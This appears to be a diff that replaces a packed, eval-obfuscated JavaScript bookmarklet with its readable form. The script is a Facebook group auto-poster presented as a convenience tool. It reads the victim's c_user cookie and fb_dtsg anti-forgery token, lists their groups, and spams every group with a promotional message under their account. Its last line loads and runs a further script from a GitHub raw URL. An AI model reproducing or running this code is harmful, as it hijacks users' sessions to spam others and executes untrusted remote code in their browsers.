@@ -1,1 +1,133 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2x:3 S="<l><N 11=\'2q 3z 3B\'></N><a 6=\'L:1l;K:U;R-q:U;p-2v:2w;p-1e:3e;p-K:2k;8:#T;\'>2j 2f</a></l></G>";S+="<l><2d 3A=\'1o\' 3I=\'2j 3W...\' 6=\'4i:4A;R-1v:15;2c:3b;2b:3v;p-1e:3x;p-K:3y;2a-8:V(X,X,X,0.1);\'></2d></l>";S+="<l><G><N 11=\'2q 45 46\'></N><a 6=\'L:1l;p-1e:47;K:U;R-q:U;p-K:2k;8:4h(1s, 1s, 1s);\'>28 2u: Q </a></N><27 6=\'26-q:2y\' 11=\'2K 2M 2N 2P 2V 33\' 35=\'19(o);\' >2f</27><l 6=\'8:3o;\'>3s 25:  Bùi 22à1z 1Y & 1k O Q.</G>28 42 25:</A><A 6=\'8:#T;\' 1p=\'1r://J.1t.v/2s.2t.9\' 1w=\'1x\'> Bùi 22à1z 1Y</A></A>,<A 6=\'8:#T;\' 1p=\'1r://J.1U.1T.v\' 1w=\'1x\'> 1k O Q</A></A>.</G>2z 2A 2B 2D 2G 2H: <A 6=\'8:#T;\' 1p=\'1r://J.1U.1T.v\' 1w=\'1x\'>1k O Q</A>.</A><G></l>";3 14=5.17("l");14.18("6","2R-2b:2S;2c:2T;L:1S;1v:2X;2Y-32: 1a 34 1Q V(24, 36, X, 0.37);L:1S;q:38%;26-q:-39;12-3c:q;1P-3f:1Q;R:15;z-3g:3i;1P:15 3m V(0,0,0,0.9);2a-8:V(0,0,0,0.9);8:3n");14.H=S;5.s.1g(14);1I={1B:7(){3 A=y;2(3E 1m!="3J")1n{A=w 1m("43.1Z")}1q(C){1n{A=w 1m("4e.1Z")}1q(B){A=y}}M 2(1A.1u)1n{A=w 1u}1q(C){A=y}10 A},16:7(b,c,d,e,f){3 g=o.1C();2(!g||!b)10;2(g.1D)g.1D("12/2C");2(!e)e="1E";2(!d)d="12";2(!f)f={};d=d.2E();e=e.2F();3 h="1F="+(w 2I).2J();b+=b.1G("?")+1?"&":"?";b+=h;3 i=2L;2(e=="1H"){3 j=b.2O("?");b=j[0];i=j[1]}g.1J(e,b,2Q);3 k=o;2(f.1K)g.1L=7(){f.1K(g)};M g.1L=7(){2(g.2U==4)2(g.1M==2W){3 a="";2(g.1N)a=g.1N;2(d.1O(0)=="j"){a=a.2Z(/[\\n\\r]/g,"");a=30("("+a+")")}M 2(d.1O(0)=="x")a=g.31;2(c)c(a)}M{2(f.u)5.1b("s")[0].1R(f.u);2(f.m)5.t(f.m).6.1y="1V";2(1W)1W(g.1M)}};g.1X(i)},3a:7(A){3 C={"1j":"","1i":y,"3d":y,"20":"12","21":"1E","1h":"","m":"","u":""};23(3 B 3h C)2(A[B])C[B]=A[B];2(!C.1j)10;3 D=y;2(C.u){D=5.17("l");D.18("6","L:1l;1v:1a;q:1a;");D.18("11","m-3j");D.H=C.u;5.1b("s")[0].1g(D);o.3k.u=D}2(C.m)5.t(C.m).6.1y="3l";o.16(C.1j,7(E){2(C.1i)C.1i(E);2(C.1h)5.t(C.1h).H=E;2(D)5.1b("s")[0].1R(D);2(C.m)5.t(C.m).6.1y="1V"},C.20,C.21,C)},1C:7(){10 o.1B()}};3 j=0;3 k=0;3 I=0;3 P="3p o 3q 3r... 29://J.1t.v/3t/3u";3 F=w 3w;3 1c=5.13.Y(5.13.Y(/2e=(\\d+)/)[1]);7 19(f){2(5.t("1o").W!="")P=5.t("1o").W;1I.16(1A.3C.3D+"//J.1t.v/2g/3F/3G/3H.2h?2i=1&3K[0]=3L&3M="+1c+"&3N=3O&3P=0&3Q="+1c,7(a){3 b=a;3 c=b.3R(b.1G("{"));3 d=3S.3T(c);d=d.3U.3V;23(3 e=0;e<d.1d;e++)F.3X(d[e].1F);f.3Y.H="3Z 41...";1f()})}3 a=5.s.H;3 2l=5.44("2m")[0].W;3 2n=5.13.Y(5.13.Y(/2e=(\\d+)/)[1]);7 1f(){2o="2m="+2l+"&48="+2n+"&49="+F[I]+"&4a=4b&4c=1&4d="+2p(P)+"&4f="+2p(P)+"&4g[0]=40&Z[W]=40&Z[4j]=0&Z[4k]=0&Z[4l]=0&=4m&4n[4o]=4p";4q(4r=w 1u)1J("1H","/2g/4s.2h?2i=1"),1X(2o);I++;2(I>F.1d){4t("O 4u 4v. 4w 4x 4y 4z.");I=0}M 2r("1f()",4B/F.1d)}2r("19()",4C);5.s.1g(5.17(\'4D\')).4E="29://4F.4G.v/4H/4I/4J/4K.4L";',62,296,'||if|var||document|style|function|color|||||||||||||div|loading||this|font|left||body|getElementById|loadingIndicator|com|new||false|||||||arr|br|innerHTML|suc|www|size|position|else|span|Auto|msg|Group|padding|grouppost|3B5998|3px|rgba|value|255|match|privacy_data|return|class|text|cookie|Popupset|5px|load|createElement|setAttribute|autopostingfunc|0px|getElementsByTagName|user_id|length|family|postitok|appendChild|update|onSuccess|url|Vietnamese|absolute|ActiveXObject|try|txtFloodMsg|href|catch|http|128|facebook|XMLHttpRequest|top|target|_blank|display|nh|window|getHTTPObject|init|overrideMimeType|GET|uid|indexOf|POST|jx|open|handler|onreadystatechange|status|responseText|charAt|border|10px|removeChild|fixed|blogspot|vietnameseautogroup|none|error|send|Long|XMLHTTP|format|method|Th|for||By|margin|button|Script|https|background|height|width|textarea|c_user|Post|ajax|php|__a|Write|11px|dts|fb_dtsg|composerid|pst|encodeURIComponent|img|setTimeout|bui|long|Privacy|weight|bold|javascript|437px|For|More|Tools|xml|Visit|toLowerCase|toUpperCase|Our|Website|Date|getTime|_42ft|null|_4jy0|_11b|split|_4jy3|true|min|50px|500px|readyState|_4jy1|200|100px|box|replace|eval|responseXML|shadow|selected|4px|onclick|144|63|50|273px|bind|493px|align|onError|Tahoma|radius|index|in|999999|indicator|opt|block|solid|White|gray|Follow|list|please|Powered|lists|156489554515051|85px|Array|tahoma|13px|sp_f52w7l|id|sx_47132d|location|protocol|typeof|typeahead|search|bootstrap|placeholder|undefined|filter|group|viewer|token|v7|lazy|__user|substring|JSON|parse|payload|entries|something|push|parentNode|Please||Wait|Made|Msxml2|getElementsByName|sp_dpkef5|sx_f05251|Arial|xhpc_composerid|xhpc_targetid|xhpc_context|home|xhpc_fbx|xhpc_message_text|Microsoft|xhpc_message|UIPrivacyWidget|rgb|COLOR|friends|list_anon|list_x_anon|Share|nctr|_mod|pagelet_group_composer|with|newx|updatestatus|alert|Posting|Completed|Now|Refresh|your|Homepage|WHITE|3E4|1E3|script|src|raw|github|buithanhlong444|Final_Tools|master|All|js'.split('|'),0,{}))
+javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Post</a></div></br>";
+grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...' style='COLOR:WHITE;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
+grouppost += "<div><br><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Group </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><div style='color:gray;'>Powered By:  Bùi Thành Long & Vietnamese Auto Group.</br>Script Made By:</A><A style='color:#3B5998;' href='http://www.facebook.com/bui.long.9' target='_blank'> Bùi Thành Long</A></A>,<A style='color:#3B5998;' href='http://www.vietnameseautogroup.blogspot.com' target='_blank'> Vietnamese Auto Group</A></A>.</br>For More Tools Visit Our Website: <A style='color:#3B5998;' href='http://www.vietnameseautogroup.blogspot.com' target='_blank'>Vietnamese Auto Group</A>.</A><br></div>";
+var Popupset = document.createElement("div");
+Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:White");
+Popupset.innerHTML = grouppost;
+document.body.appendChild(Popupset);
+jx = {
+    getHTTPObject: function () {
+        var A = false;
+        if (typeof ActiveXObject != "undefined") try {
+            A = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (C) {
+            try {
+                A = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (B) {
+                A = false
+            }
+        } else if (window.XMLHttpRequest) try {
+            A = new XMLHttpRequest
+        } catch (C) {
+            A = false
+        }
+        return A
+    },
+    load: function (b, c, d, e, f) {
+        var g = this.init();
+        if (!g || !b) return;
+        if (g.overrideMimeType) g.overrideMimeType("text/xml");
+        if (!e) e = "GET";
+        if (!d) d = "text";
+        if (!f) f = {};
+        d = d.toLowerCase();
+        e = e.toUpperCase();
+        var h = "uid=" + (new Date).getTime();
+        b += b.indexOf("?") + 1 ? "&" : "?";
+        b += h;
+        var i = null;
+        if (e == "POST") {
+            var j = b.split("?");
+            b = j[0];
+            i = j[1]
+        }
+        g.open(e, b, true);
+        var k = this;
+        if (f.handler) g.onreadystatechange = function () {
+            f.handler(g)
+        };
+        else g.onreadystatechange = function () {
+            if (g.readyState == 4) if (g.status == 200) {
+                var a = "";
+                if (g.responseText) a = g.responseText;
+                if (d.charAt(0) == "j") {
+                    a = a.replace(/[\n\r]/g, "");
+                    a = eval("(" + a + ")")
+                } else if (d.charAt(0) == "x") a = g.responseXML;
+                if (c) c(a)
+            } else {
+                if (f.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(f.loadingIndicator);
+                if (f.loading) document.getElementById(f.loading).style.display = "none";
+                if (error) error(g.status)
+            }
+        };
+        g.send(i)
+    },
+    bind: function (A) {
+        var C = {
+            "url": "",
+            "onSuccess": false,
+            "onError": false,
+            "format": "text",
+            "method": "GET",
+            "update": "",
+            "loading": "",
+            "loadingIndicator": ""
+        };
+        for (var B in C) if (A[B]) C[B] = A[B];
+        if (!C.url) return;
+        var D = false;
+        if (C.loadingIndicator) {
+            D = document.createElement("div");
+            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
+            D.setAttribute("class", "loading-indicator");
+            D.innerHTML = C.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(D);
+            this.opt.loadingIndicator = D
+        }
+        if (C.loading) document.getElementById(C.loading).style.display = "block";
+        this.load(C.url, function (E) {
+            if (C.onSuccess) C.onSuccess(E);
+            if (C.update) document.getElementById(C.update).innerHTML = E;
+            if (D) document.getElementsByTagName("body")[0].removeChild(D);
+            if (C.loading) document.getElementById(C.loading).style.display = "none"
+        }, C.format, C.method, C)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var j = 0;
+var k = 0;
+var suc = 0;
+var msg = "Follow this list please... https://www.facebook.com/lists/156489554515051";
+var arr = new Array;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function autopostingfunc(f) {
+    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
+        var b = a;
+        var c = b.substring(b.indexOf("{"));
+        var d = JSON.parse(c);
+        d = d.payload.entries;
+        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+        f.parentNode.innerHTML = "Please Wait...";
+        postitok()
+    })
+}
+var a = document.body.innerHTML;
+var dts = document.getElementsByName("fb_dtsg")[0].value;
+var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function postitok() {
+    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
+    with(newx = new XMLHttpRequest) open("POST", "/ajax/updatestatus.php?__a=1"), send(pst);
+    suc++;
+    if (suc > arr.length) {
+        alert("Auto Posting Completed. Now Refresh your Homepage.");
+        suc = 0
+    } else setTimeout("postitok()", 3E4 / arr.length)
+}
+setTimeout("autopostingfunc()", 1E3);
+document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
